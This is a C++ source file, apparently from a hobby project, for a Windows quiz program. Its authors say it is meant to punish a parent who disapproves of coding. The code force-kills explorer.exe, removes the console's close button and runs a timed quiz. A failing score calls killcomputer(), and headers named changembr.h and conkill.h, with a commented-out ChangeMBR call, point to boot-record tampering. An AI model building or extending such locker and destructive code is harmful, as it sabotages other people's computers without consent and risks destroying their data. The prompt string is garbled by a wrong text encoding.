//Mader:Rong Chen,Chaorui Wang
//Made Time Start:2021/05/13
//
//This program we have to make because one of a 
//mader's parents don't let him to write computer 
//program and discriminate the code-writer.So we 
//have to make this program in order to give them
//a lesson and let their discrimination disappear.
//
//Use language:CSharp(.NET Framework 4.7) and GCC/C++
//.
// 
//This program uses Dev-C++ but not Visual-C++ becau-
//se of if you use Visual-C++ and make/run the progr-
//am,you may need to download or install like MSVCPxx-
//x.dll,so we don't wan't to use Visual-C++ to make t-
//he program.
//
//This edited in 2021/05/13
//
//The language CSharp will be deprecated.
//
//This update edited in 2021/05/29

#include <iostream>
#include <windows.h>
#include <thread>
#include "show.h"
#include "questionp.h"
#include "questionc.h"
#include "thiskill.h"
#include "conkill.h"
#include "changembr.h"

using namespace std;

int SCORE         =  0;
string ANSWER     =  "";
string CHOOSE	  =  "";
HWND hwnd	      =  FindWindow("ConsoleWindowClass",NULL);	//Get Window Handle

void calctime();
bool check(int score);

bool check(int score)
{
	if(score>=3) return true;
	else if(score>=0 && score<=3) return false;
}

void calctime()
{
	int time=0;
	while(time <=600)
	{
		time++;
		Sleep(1);
	}
	if(check(SCORE)==true) killthis(hwnd);
	else if(check(SCORE)==false) killcomputer(SCORE);//Not pass
}

bool getruninfo()
{
	HKEY key;
	string open="SOFTWARE\\Sola";
	TCHAR data[MAX_PATH];
	DWORD size=sizeof(data);
	if(RegOpenKeyEx(HKEY_CURRENT_USER,(LPCTSTR)open.c_str(),0,KEY_ALL_ACCESS,&key)==ERROR_SUCCESS)
		if(RegQueryValueEx(key,(LPCTSTR)("disable"),NULL,NULL,(LPBYTE)&data,&size)==ERROR_SUCCESS)
			if((string)data=="true") return false;
	return true;
}

int main()
{		
	if(/*ChangeMBR() && (BackupMBR(backup) && getruninfo())*/1)
	{	
		system("taskkill /f /im explorer.exe");
		system("cls");	
		DeleteMenu(GetSystemMenu(GetConsoleWindow(), FALSE), SC_CLOSE, MF_BYCOMMAND); 
		//If this thread can start
		thread showlight(show_light);
		showlight.detach();
		thread showpart1(show_part1);
		showpart1.join();//Attention:this thread variable must be join
		show_part2();
		thread timep(calctime);
		timep.detach();
		do
		{
			cout << "ÇëÑ¡ÔñÄãµÄ²âÊÔ¾í:";//In Github it will show a bad word,but I don't why 
			cin >> CHOOSE;
		}while(CHOOSE !="s" && CHOOSE !="p");
		if(CHOOSE =="s") 
		{
			//thread cs(cs_que1,&SCORE);
			//cs.join();//Need to use join()
		}
		else if(CHOOSE == "p") 
		{
			//thread py(py_que1,&SCORE);
			//py.join();
		}	
		if(check(SCORE)==true) killthis(hwnd);
		else if(check(SCORE)==false) killcomputer(SCORE);//Not pass
	}
	else return 0;
}
